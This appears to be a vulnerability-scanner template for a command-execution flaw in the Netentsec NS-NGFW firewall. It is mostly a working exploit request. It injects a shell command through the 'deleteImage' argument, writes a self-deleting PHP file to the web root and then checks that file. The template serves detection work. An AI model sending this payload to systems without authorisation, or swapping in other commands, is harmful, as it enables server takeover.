id: Netentsec-Ngfw-Rce
info:
  name: Netentsec Next-Generation Firewall Arbitrary Command Execution Vulnerability
  author:
  - l0ne1y
  tags:
  - netentsec
  - rce
  description: |-
    Netentsec Next-Generation Firewall Arbitrary Command Execution Vulnerability
    The Beijing Netentsec NS-NGFW Next-Generation Firewall is a high-performance application-layer firewall that can comprehensively respond to network threats.

    The Beijing Netentsec NS-NGFW Next-Generation Firewall has a command execution vulnerability. Attackers can exploit it to gain control of the server.
  reference:
  - https://mp.weixin.qq.com/s/wh5lulise_g381w2ssv93g
  severity: critical
  remediation: |-
    Official remediation:
    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor: https://www.netentsec.com/product/lists_265.html
requests:
- matchers:
  - type: word
    condition: and
    words:
    - SSLVPN_Resource
    - '"result":{"success":true}'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/directdata/direct/router'
  method: POST
  body: '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo
    ''<?php echo {{randstr}};unlink(__FILE__);?>'' >/var/www/html/xASDasda.php"]}],"type":"rpc","tid":17}'
- matchers:
  - type: word
    words:
    - '{{randstr}}'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/xASDasda.php'
  method: GET
  body: '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo
    ''<?php echo {{randstr}};unlink(__FILE__);?>'' >/var/www/html/xASDasda.php"]}],"type":"rpc","tid":17}'
